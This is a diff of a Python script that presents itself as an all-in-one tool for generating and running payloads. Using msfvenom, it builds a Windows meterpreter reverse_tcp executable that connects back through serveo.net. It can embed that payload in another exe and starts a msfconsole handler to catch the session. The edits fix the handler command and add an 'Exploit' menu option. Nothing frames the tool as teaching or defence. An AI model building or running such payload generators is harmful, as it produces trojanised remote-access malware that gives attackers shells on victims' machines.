@@ -215,7 +215,7 @@ def generatewindowspayload():
      print("Payload is generating please be patient [*]")
      os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=" + x +" -o $HOME/downloads/windowspayload.exe")
      prGreen ("The bare payload has been saved as $HOME/downloads/windowspayload.exe")
-     z1 = input("Do you want to embed the payload? (will cause payload to regenerate. May not work. Worth a shot.) y/n ")
+     z1 = input("Do you want to embed the payload? {This is broken Currently.}(will cause payload to regenerate. May not work. Worth a shot.) y/n ")
      if z1.lower() == "y":
          n1 = input("path of parent exe file to embed in?: ")
          print("Working...Please be patient[*]")
@@ -233,7 +233,7 @@ def exploitwindowspayload():
     prYellow("make sure the target ran the payload")
     time.sleep(10)
     os.system('cd $HOME ')
-    os.system("msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + ":run'")
+    os.system("msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST localhost;set LPORT " + x + ";run'")
 def choice1():
     e1 = input('''Choose Platform
                [1] Android
@@ -258,7 +258,8 @@ def choice2():
                   
 prGreen ("The All in One Tool To Generate and Run payloads!")
 print ('''What Do You Want To Do Now?
-       [1] Make A Payload  
+       [1] Make A Payload 
+       [2] Exploit
        [0] Exit ''' )
 des1 = input() 
 if des1 == '1':
